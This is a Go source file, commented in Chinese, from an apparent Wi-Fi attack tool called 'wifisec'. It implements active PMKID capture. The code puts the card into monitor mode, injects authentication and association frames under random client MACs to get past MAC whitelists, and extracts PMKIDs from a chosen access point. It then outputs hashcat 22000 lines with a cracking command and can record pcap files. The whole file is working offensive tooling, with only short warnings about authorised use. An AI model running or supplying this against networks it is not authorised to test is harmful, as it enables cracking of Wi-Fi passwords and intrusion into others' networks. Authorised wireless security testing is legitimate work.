// pmkid.go 实现 `wifisec pmkid` 与 `get_packet --pmkid`：
// 主动 PMKID 获取的编排层。
//
// 与 deauth → 抓握手链路互补：不依赖真实客户端在线，本机扮演
// "假客户端"（Auth + Assoc），从关联响应 / EAPOL M1 的 RSN IE 中
// 提取 PMKID，直接产出 hashcat 22000 攻击行。编排层只做三件事：
// 解析目标（BSSID/信道/ESSID 严格成对绑定）、准备 monitor + 注入
// 环境、驱动 internal/pmkid 状态机并渲染结果；帧构造与协议状态机
// 全部在 internal/pmkid / internal/ieee80211 / internal/eapol 纯逻辑包中。
//
// 用法：wifisec pmkid <ssid|bssid> [iface] [-o out.22000] [--ssid 网络名]
//
//	[--attempts 次数] [--json]
package functions

import (
	"context"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/ctkqiang/wifisec/internal/constants"
	"github.com/ctkqiang/wifisec/internal/eapol"
	"github.com/ctkqiang/wifisec/internal/pcapfile"
	platformcapture "github.com/ctkqiang/wifisec/internal/platform/capture"
	platformlinux "github.com/ctkqiang/wifisec/internal/platform/linux"
	platformwindows "github.com/ctkqiang/wifisec/internal/platform/windows"
	"github.com/ctkqiang/wifisec/internal/pmkid"
	"github.com/ctkqiang/wifisec/internal/utilities"
)

// pmkidHashFileMode：22000 文件是可直接喂给 hashcat 的爆破素材，
// 与口令同级敏感，落盘按 0600 对待。
const pmkidHashFileMode = 0o600

// pmkidFailureHints 是失败分类的可行动提示，与 pmkid.Failure 一一对应。
// 分类本身由 pmkid 包判定，这里只负责把分类翻译成"下一步该做什么"。
var pmkidFailureHints = map[pmkid.Failure]string{
	pmkid.FailureNoBeacon:    "确认目标在信号范围内且 monitor 接口已建立；部分 USB 网卡 monitor 下收不到帧，重插或换驱动",
	pmkid.FailureNoRSNIE:     "目标为开放网络或 WEP，不存在 PMKID",
	pmkid.FailureNonPSK:      "802.1X/Enterprise 认证（或 SAE）的 PMKID 与 PSK 字典无关，PMKID 爆破不适用于该网络",
	pmkid.FailureRSNNoPMKID:  "AP 未在 PMKSA 缓存返回 PMKID（部分固件默认关闭）；改走 deauth + get_packet 四次握手路径",
	pmkid.FailureAuthReject:  "认证被拒：可能开启了 MAC 白名单；重试已自动更换客户端 MAC，持续被拒请换环境",
	pmkid.FailureAssocReject: "关联被拒：能力集不符或 AP 负载满，稍后重试",
	pmkid.FailureHiddenSSID:  "用 --ssid 显式提供网络名（PBKDF2 需要它作为 salt）",
	pmkid.FailureTimeout:     "流程中断在中间阶段：增大 --attempts 或靠近目标重试",
}

// PMKIDOptions 是 pmkid 子命令解析后的参数集。
type PMKIDOptions struct {
	Target    string // SSID 或 BSSID（位置参数 1）
	Interface string // 网卡名（位置参数 2，空 = 自动选择）
	Output    string // -o：hashcat 22000 行落盘路径
	SSID      string // --ssid：隐藏网络显式 ESSID（PBKDF2 salt）
	Attempts  int    // --attempts：尝试轮次上限，0 = 库默认
	JSON      bool   // --json：机器可读输出
}

// pmkidAP 是目标解析的中间表示：Linux iw 与 Windows netsh 的扫描
// 结果收敛到这一个结构，判定逻辑得以平台无关。
type pmkidAP struct {
	bssid   string // 小写冒号分隔
	ssid    string // 隐藏网络为空串
	channel int
	rssi    int // dBm，未知为 0
}

// pmkidSession 持有一次主动获取所需的全部平台资源，由调用方 Cleanup。
type pmkidSession struct {
	AP         pmkidAP
	Source     platformcapture.Source // 帧源（radiotap 视角）
	Injector   pmkid.FrameWriter
	SetChannel func(int) error
	Label      string // 供日志展示的接口标识
	Cleanup    func()
}

// pmkidJSONResult 是 --json 的输出结构；字段名与 hashcat 社区记法
// 对齐（小写下划线），format_version 标明 22000 规格来源。
type pmkidJSONResult struct {
	PMKID         string `json:"pmkid"`
	MACAP         string `json:"mac_ap"`
	MACSTA        string `json:"mac_sta"`
	ESSID         string `json:"essid"`
	ESSIDKnown    bool   `json:"essid_known"`
	Channel       int    `json:"channel"`
	RSSI          int    `json:"rssi"`
	Attempt       int    `json:"attempt"`
	FormatVersion string `json:"format_version"`
	Hashcat22000  string `json:"hashcat_22000,omitempty"`
}

// RunPMKID 是 `wifisec pmkid` 的入口。
func RunPMKID(arguments []string) error {
	options, err := ParsePMKIDArgs(arguments)
	if err != nil {
		return err
	}

	// 非 MAC 格式即按 SSID 处理，与 deauth 的目标判定规则一致。
	targetMAC, _ := net.ParseMAC(options.Target)

	session, err := openPMKIDSession(options, targetMAC)
	if err != nil {
		return err
	}
	defer session.Cleanup()

	ctx, stop := setupSignalHandler()
	defer stop()

	return runPMKIDClient(ctx, options, session.AP, session.Source, session.Injector, session.SetChannel, session.Label)
}

// ParsePMKIDArgs 解析位置参数与 flag：位置 1 是目标（SSID|BSSID），
// 位置 2 是网卡；-o/--ssid/--attempts 带值，--json 为布尔。
func ParsePMKIDArgs(arguments []string) (PMKIDOptions, error) {
	options := PMKIDOptions{}

	for index := 0; index < len(arguments); index++ {
		token := strings.TrimSpace(arguments[index])
		if token == "" {
			continue
		}

		switch {
		case token == "-o":
			if index+1 >= len(arguments) {
				return options, errors.New("-o 需要输出文件路径，例如 -o out.22000")
			}

			index++
			options.Output = strings.TrimSpace(arguments[index])
		case token == "--ssid":
			if index+1 >= len(arguments) {
				return options, errors.New("--ssid 需要网络名，例如 --ssid MyWiFi")
			}

			index++
			options.SSID = strings.TrimSpace(arguments[index])
		case token == "--attempts":
			if index+1 >= len(arguments) {
				return options, errors.New("--attempts 需要正整数，例如 --attempts 5")
			}

			index++
			attempts, err := strconv.Atoi(strings.TrimSpace(arguments[index]))
			if err != nil || attempts <= 0 {
				return options, fmt.Errorf("非法尝试次数 %q：请给出正整数", arguments[index])
			}

			options.Attempts = attempts
		case token == "--json":
			options.JSON = true
		case strings.HasPrefix(token, "-"):
			return options, fmt.Errorf("无法识别的参数 %q（支持 -o/--ssid/--attempts/--json）", token)
		default:
			if options.Target == "" {
				options.Target = token
			} else if options.Interface == "" {
				options.Interface = token
			} else {
				return options, fmt.Errorf("无法识别的多余参数 %q", token)
			}
		}
	}

	if options.Target == "" {
		return options, errors.New("用法：wifisec pmkid <ssid|bssid> [iface] [-o out.22000] [--ssid 网络名] [--attempts 次数] [--json]")
	}

	return options, nil
}

// openPMKIDSession 按平台准备 PMKID 会话资源（monitor + 读帧 + 注入）。
// RunPMKID 与 get_packet --pmkid 共用这一个入口，保证两条命令的
// 环境准备与错误提示完全一致。
func openPMKIDSession(options PMKIDOptions, targetMAC net.HardwareAddr) (*pmkidSession, error) {
	if constants.EMBEDDED_MODE {
		return nil, errors.New("PMKID 会话需要收发双向交互（认证/关联后收取 M1），ESP 协处理器当前协议仅支持单向注入；请使用本机无线网卡路径")
	}

	switch utilities.GetOS() {
	case utilities.Linux, utilities.Android:
		return openPMKIDSessionLinux(options, targetMAC)
	case utilities.Windows:
		return openPMKIDSessionWindows(options, targetMAC)
	default:
		return nil, pmkidDarwin()
	}
}

// openPMKIDSessionLinux 准备 Linux/Android(Termux) 的会话资源：
// monitor VIF 上同时开读帧（AF_PACKET）与注入（AF_PACKET），全程 root。
func openPMKIDSessionLinux(options PMKIDOptions, targetMAC net.HardwareAddr) (*pmkidSession, error) {
	if err := checkRootWithGUI(); err != nil {
		return nil, err
	}

	iface, err := selectWirelessInterface(options.Interface)
	if err != nil {
		return nil, err
	}

	if iface.Mode == "managed" && iface.State == "UP" {
		utilities.Warn("接口 %s 当前处于 managed 模式且已连接，进入 monitor 模式将断开当前 Wi-Fi 连接", iface.Name)
	}

	scanned, err := platformlinux.Scan(iface.Name)
	if err != nil {
		return nil, fmt.Errorf("扫描失败：%w", err)
	}

	ap, err := pmkidResolveTarget(linuxScanToAPs(scanned), options.Target, targetMAC, options.SSID)
	if err != nil {
		return nil, err
	}

	monitorName, ownMonitor, err := prepareMonitor(iface)
	if err != nil {
		return nil, err
	}

	source, err := platformcapture.Open(monitorName)
	if err != nil {
		if ownMonitor {
			_ = platformlinux.DeleteInterface(monitorName)
		}

		return nil, err
	}

	// 链路类型不是 802.11 视角说明 monitor 未生效（如驱动静默降级），
	// 继续跑只会得到 no-beacon 假象，提前给出可行动的错误。
	switch source.LinkType() {
	case platformcapture.LinkTypeIEEE80211Radio, 105:
	default:
		_ = source.Close()
		if ownMonitor {
			_ = platformlinux.DeleteInterface(monitorName)
		}

		return nil, fmt.Errorf("接口 %s 的链路类型为 DLT %d（预期 127/105）：monitor 模式未生效，无法进行 PMKID 会话", monitorName, source.LinkType())
	}

	injector, err := platformlinux.OpenInjector(monitorName)
	if err != nil {
		_ = source.Close()
		if ownMonitor {
			_ = platformlinux.DeleteInterface(monitorName)
		}

		return nil, err
	}

	return &pmkidSession{
		AP:       ap,
		Source:   source,
		Injector: injector,
		SetChannel: func(channel int) error {
			return platformlinux.SetChannel(monitorName, channel)
		},
		Label: monitorName,
		Cleanup: func() {
			_ = source.Close()
			_ = injector.Close()
			if ownMonitor {
				if err := platformlinux.DeleteInterface(monitorName); err != nil {
					utilities.Warn("清理 monitor 接口 %s 失败：%v", monitorName, err)
				}
			}
		},
	}, nil
}

// openPMKIDSessionWindows 准备 Windows 的会话资源：Npcap 上开两个
// 句柄——读帧走 capture 层（radiotap 视角），注入走 platformwindows
// 注入器；monitor 切换与恢复镜像 deauthWindows 的序列。
func openPMKIDSessionWindows(options PMKIDOptions, targetMAC net.HardwareAddr) (*pmkidSession, error) {
	if err := checkAdminWithGUI(); err != nil {
		return nil, err
	}

	if err := platformwindows.CheckNpcap(); err != nil {
		return nil, err
	}

	iface, err := selectWindowsInterface(options.Interface)
	if err != nil {
		return nil, err
	}

	if iface.GUID == "" {
		return nil, fmt.Errorf("接口 %s 缺少 GUID，无法构造 Npcap 设备路径", iface.Name)
	}

	if iface.State == "UP" {
		utilities.Warn("接口 %s 当前已连接，进入 monitor 模式将断开当前 Wi-Fi 连接", iface.Name)
	}

	scanned, err := platformwindows.Scan()
	if err != nil {
		return nil, fmt.Errorf("扫描失败：%w", err)
	}

	ap, err := pmkidResolveTarget(windowsScanToAPs(scanned), options.Target, targetMAC, options.SSID)
	if err != nil {
		return nil, err
	}

	devicePath := platformwindows.NPFDevicePath(iface.GUID)
	monitorWasActive, err := platformwindows.SetMonitorMode(devicePath, true)
	if err != nil {
		return nil, fmt.Errorf("切换 monitor 模式失败：%w", err)
	}

	restore := func() {
		if monitorWasActive {
			return
		}

		if _, err := platformwindows.SetMonitorMode(devicePath, false); err != nil {
			utilities.Warn("恢复 managed 模式失败：%v", err)
		}
	}

	source, err := platformcapture.Open(devicePath)
	if err != nil {
		restore()
		return nil, err
	}

	switch source.LinkType() {
	case platformcapture.LinkTypeIEEE80211Radio, 105:
	default:
		_ = source.Close()
		restore()

		return nil, fmt.Errorf("接口 %s 的链路类型为 DLT %d（预期 127/105）：monitor 模式未生效，无法进行 PMKID 会话", iface.Name, source.LinkType())
	}

	injector, err := platformwindows.OpenInjector(devicePath)
	if err != nil {
		_ = source.Close()
		restore()

		return nil, err
	}

	return &pmkidSession{
		AP:       ap,
		Source:   source,
		Injector: injector,
		SetChannel: func(channel int) error {
			return platformwindows.SetChannel(devicePath, channel)
		},
		Label: iface.Name,
		Cleanup: func() {
			_ = source.Close()
			_ = injector.Close()
			restore()
		},
	}, nil
}

// pmkidDarwin 给出 macOS 无法主动获取 PMKID 的精确技术原因：
// 注入 Auth/Assoc 帧是 PMKID 会话的前提，而 Apple 未开放注入通道。
func pmkidDarwin() error {
	return errors.New(
		"macOS 不支持 802.11 帧注入：Apple 未开放任何公共 API（CoreWLAN 仅提供扫描与关联），" +
			"主动 PMKID 会话无法执行；请改用 Linux，或在连接态用 wifisec get_packet --eapol 被动抓取握手")
}

// runPMKIDClient 是跨平台共享的会话驱动：建客户端、跑状态机、渲染结果。
// reader/writer/setChannel 由平台路径注入，本函数不感知 AF_PACKET 或 Npcap。
func runPMKIDClient(
	ctx context.Context,
	options PMKIDOptions,
	ap pmkidAP,
	reader pmkid.FrameReader,
	writer pmkid.FrameWriter,
	setChannel func(int) error,
	ifaceLabel string,
) error {
	client := pmkid.NewClient(pmkid.Config{
		BSSID:      ap.bssid,
		SSID:       ap.ssid,
		Channel:    ap.channel,
		Reader:     reader,
		Writer:     writer,
		SetChannel: setChannel,
		Attempts:   options.Attempts,
	})

	utilities.Info("PMKID 会话启动：接口 %s · 目标 %s（%.32s）· 信道 %d · 每轮随机客户端 MAC，Ctrl-C 中止",
		ifaceLabel, ap.bssid, ap.ssid, ap.channel)
	utilities.Warn("仅用于授权测试，请确保目标网络为你所有或已获书面许可")

	result, err := client.Run(ctx)
	if err != nil {
		return pmkidFailureHint(err)
	}

	return reportPMKIDResult(result, options)
}

// pmkidTeeReader 把帧流一分为二：进 pmkid 状态机前先落 pcap 并喂
// EAPOL 分析器，让"主动获取"与抓包证据共存于一次 monitor 会话。
// 落盘失败只告警不中断——证据文件残缺好过攻击会话报废。
type pmkidTeeReader struct {
	inner    platformcapture.Source
	writer   *pcapfile.Writer
	analyzer *eapol.Analyzer
	frames   int
}

// Read 实现 pmkid.FrameReader：读到的帧先复制落盘（WritePacket 内部
// 同步完成复制），再原样交给状态机。
func (t *pmkidTeeReader) Read() ([]byte, error) {
	frame, err := t.inner.Read()
	if err != nil {
		return frame, err
	}

	t.frames++
	if err := t.writer.WritePacket(frame, time.Now()); err != nil {
		utilities.Warn("写入 pcap 失败（会话继续）：%v", err)
	}

	if t.analyzer != nil {
		for _, candidate := range t.analyzer.Feed(frame) {
			printEAPOLCandidate(candidate)
		}
	}

	return frame, nil
}

// runPMKIDCaptureSession 是 get_packet --pmkid 的执行路径：
// PMKID 主动会话与 pcap 落盘共存，Ctrl-C/命中/失败均正常收尾并
// 汇报两边的产出（hash 行 + pcap 文件）。
func runPMKIDCaptureSession(options SniffOptions) error {
	// 目标优先取 --bssid（PMKID 与 BSSID 绑定），退化接受 --ssid。
	target := options.BSSID
	if target == "" {
		target = options.SSID
	}
	if target == "" {
		return errors.New("get_packet --pmkid 需要 --bssid（推荐）或 --ssid 指定目标")
	}

	utilities.Warn("抓包内容可能包含同一网络他人的通信，仅限已授权网络与设备使用")

	targetMAC, _ := net.ParseMAC(target)

	session, err := openPMKIDSession(PMKIDOptions{Target: target, Interface: options.Interface, SSID: options.SSID}, targetMAC)
	if err != nil {
		return err
	}
	defer session.Cleanup()

	outputPath := options.OutputPath
	if outputPath == "" {
		outputPath = fmt.Sprintf("%s-pmkid-%s.pcap", sniffFilePrefix, time.Now().Format(sniffTimeLayout))
	}

	file, err := os.Create(outputPath)
	if err != nil {
		return fmt.Errorf("创建 pcap 文件失败：%w", err)
	}

	writer, err := pcapfile.NewWriter(file, session.Source.LinkType())
	if err != nil {
		_ = file.Close()
		return err
	}

	// 命中 PMKID 即成功返回，多出的握手数据对离线爆破是冗余备份：
	// PMKID 行长期有效，握手对仅在密码变更前有效，两者互不冲突。
	var analyzer *eapol.Analyzer
	if options.EAPOL {
		analyzer = eapol.NewAnalyzer(int(session.Source.LinkType()))
	}

	tee := &pmkidTeeReader{inner: session.Source, writer: writer, analyzer: analyzer}

	ap := session.AP
	utilities.Info("PMKID + 抓包会话：接口 %s · 目标 %s（%.32s）· 信道 %d · pcap %s",
		session.Label, ap.bssid, ap.ssid, ap.channel, filepath.Clean(outputPath))

	client := pmkid.NewClient(pmkid.Config{
		BSSID:      ap.bssid,
		SSID:       ap.ssid,
		Channel:    ap.channel,
		Reader:     tee,
		Writer:     session.Injector,
		SetChannel: session.SetChannel,
	})

	ctx, stop := setupSignalHandler()
	defer stop()

	result, runErr := client.Run(ctx)

	if err := file.Sync(); err != nil {
		utilities.Debug("刷盘失败：%v", err)
	}
	_ = file.Close()

	utilities.Info("pcap 已保存：%s（%d 帧）", filepath.Clean(outputPath), tee.frames)

	if runErr != nil {
		return pmkidFailureHint(runErr)
	}

	return reportPMKIDResult(result, PMKIDOptions{JSON: options.JSON})
}

// pmkidResolveTarget 把扫描结果解析成唯一攻击目标：
//   - BSSID 目标：直接精确匹配；
//   - SSID 目标：命中多个 AP 时拒绝执行并列出候选——hash 与 BSSID
//     一一绑定（同名多 AP 密码相同才可能互通，但信道不同），只按
//     SSID 匹配会产出解不开的废 hash，这里在源头拦截；
//   - 隐藏 SSID：无 --ssid 覆盖直接拒绝，空 salt 的 hash 无意义。
func pmkidResolveTarget(aps []pmkidAP, target string, targetMAC net.HardwareAddr, essidOverride string) (pmkidAP, error) {
	var hits []pmkidAP

	for _, ap := range aps {
		if targetMAC != nil {
			if normalizeMAC(ap.bssid) == normalizeMAC(targetMAC.String()) {
				hits = append(hits, ap)
			}
			continue
		}

		if ap.ssid == target {
			hits = append(hits, ap)
		}
	}

	if len(hits) == 0 {
		return pmkidAP{}, fmt.Errorf("未找到目标 %s，请确认 SSID/BSSID 正确且目标在信号范围内", target)
	}

	if targetMAC == nil && len(hits) > 1 {
		lines := []string{
			fmt.Sprintf("目标 %q 命中 %d 个 AP：PMKID 与 BSSID 绑定，同名多 AP 必须逐个获取，请用 BSSID 精确指定", target, len(hits)),
		}
		for _, ap := range hits {
			lines = append(lines, fmt.Sprintf("  %s · 信道 %d · %d dBm", ap.bssid, ap.channel, ap.rssi))
		}

		return pmkidAP{}, errors.New(strings.Join(lines, "\n"))
	}

	ap := hits[0]

	if ap.ssid == "" {
		if essidOverride == "" {
			return pmkidAP{}, fmt.Errorf("目标 %s 未广播 SSID，无法构造 hash 行：请用 --ssid 显式提供网络名", ap.bssid)
		}

		ap.ssid = essidOverride
	}

	if ap.channel <= 0 {
		return pmkidAP{}, fmt.Errorf("目标 %s 的信道未知，无法锁定 monitor 信道", ap.bssid)
	}

	return ap, nil
}

// linuxScanToAPs 把 iw 扫描结果折算成平台无关的 pmkidAP。
func linuxScanToAPs(scanned []platformlinux.Network) []pmkidAP {
	aps := make([]pmkidAP, 0, len(scanned))

	for _, network := range scanned {
		aps = append(aps, pmkidAP{
			bssid:   normalizeMAC(network.BSSID),
			ssid:    normalizeHiddenSSID(network.SSID),
			channel: network.Channel,
			rssi:    network.Signal,
		})
	}

	return aps
}

// windowsScanToAPs 把 netsh 扫描结果折算成平台无关的 pmkidAP。
func windowsScanToAPs(scanned []platformwindows.Network) []pmkidAP {
	aps := make([]pmkidAP, 0, len(scanned))

	for _, network := range scanned {
		aps = append(aps, pmkidAP{
			bssid:   normalizeMAC(network.BSSID),
			ssid:    normalizeHiddenSSID(network.SSID),
			channel: network.Channel,
			rssi:    network.Signal,
		})
	}

	return aps
}

// normalizeHiddenSSID 把各平台扫描器对隐藏网络的表示（<hidden>、空串）
// 统一归为空串，目标解析层只需处理一种形态。
func normalizeHiddenSSID(ssid string) string {
	trimmed := strings.TrimSpace(ssid)
	if trimmed == "<hidden>" {
		return ""
	}

	return trimmed
}

// reportPMKIDResult 渲染成功结果：人类摘要 + hashcat 22000 行 + 落盘 + JSON。
// ESSID 未知时 Format22000 拒绝产出——原始 PMKID 照常展示，但明确
// 说明缺 salt，不静默产出废 hash。
func reportPMKIDResult(result *pmkid.Result, options PMKIDOptions) error {
	candidate := pmkidCandidateOf(result)
	hashLine, hashErr := eapol.Format22000(candidate)

	detail := fmt.Sprintf("AP %s · 信道 %d", result.MACAP, result.Channel)
	if result.RSSI != 0 {
		detail += fmt.Sprintf(" · %d dBm", result.RSSI)
	}

	lines := []string{
		fmt.Sprintf("PMKID 获取成功（第 %d 轮尝试）", result.Attempt),
		"  " + detail,
		"  PMKID " + hex.EncodeToString(result.PMKID[:]),
		"  STA   " + result.MACSTA + "（本次随机客户端 MAC）",
		"  ESSID " + result.ESSID,
	}

	if hashErr != nil {
		lines = append(lines, "  "+hashErr.Error())
	} else {
		lines = append(lines,
			"  hashcat "+hashLine,
			"  提示  hashcat -m 22000 <hash行> 字典.txt（-o 可直接落盘）")
	}

	utilities.Info("%s", strings.Join(lines, "\n"))

	if hashErr == nil && options.Output != "" {
		if err := os.WriteFile(options.Output, []byte(hashLine+"\n"), pmkidHashFileMode); err != nil {
			return fmt.Errorf("写入 %s 失败：%w", options.Output, err)
		}

		utilities.Info("hash 行已写入 %s：hashcat -m 22000 %s 字典.txt", options.Output, options.Output)
	}

	if options.JSON {
		return printPMKIDJSON(result, hashLine, hashErr == nil)
	}

	return nil
}

// printPMKIDJSON 输出机器可读结果，供管道化消费。
func printPMKIDJSON(result *pmkid.Result, hashLine string, hashOK bool) error {
	payload := pmkidJSONResult{
		PMKID:         hex.EncodeToString(result.PMKID[:]),
		MACAP:         result.MACAP,
		MACSTA:        result.MACSTA,
		ESSID:         result.ESSID,
		ESSIDKnown:    result.ESSIDKnown,
		Channel:       result.Channel,
		RSSI:          result.RSSI,
		Attempt:       result.Attempt,
		FormatVersion: eapol.FormatVersion,
	}
	if hashOK {
		payload.Hashcat22000 = hashLine
	}

	data, err := json.MarshalIndent(payload, "", "  ")
	if err != nil {
		return err
	}

	fmt.Println(string(data))

	return nil
}

// pmkidCandidateOf 把 pmkid.Result 折算成 eapol 格式化器接受的候选。
func pmkidCandidateOf(result *pmkid.Result) eapol.Candidate {
	messagePair := byte(eapol.MessagePairPMKIDFromAP)
	if result.PMKIDSHA256 {
		messagePair |= eapol.MessagePairPMKIDSHA256
	}

	return eapol.Candidate{
		Kind:        eapol.KindPMKID,
		MessagePair: messagePair,
		PMKID:       result.PMKID,
		MACAP:       result.MACAP,
		MACSTA:      result.MACSTA,
		ESSID:       result.ESSID,
		ESSIDKnown:  result.ESSIDKnown,
		Channel:     result.Channel,
	}
}

// pmkidFailureHint 把 pmkid 分类错误翻译成带可行动提示的返回值；
// 非分类错误（ctx 取消、平台错误）原样透传。
func pmkidFailureHint(err error) error {
	if errors.Is(err, context.Canceled) {
		return errors.New("PMKID 会话已被中止（Ctrl-C）")
	}

	var pmkidErr *pmkid.Error
	if !errors.As(err, &pmkidErr) {
		return err
	}

	hint, ok := pmkidFailureHints[pmkidErr.Failure]
	if !ok {
		return pmkidErr
	}

	return fmt.Errorf("%w\n可行动提示：%s", pmkidErr, hint)
}
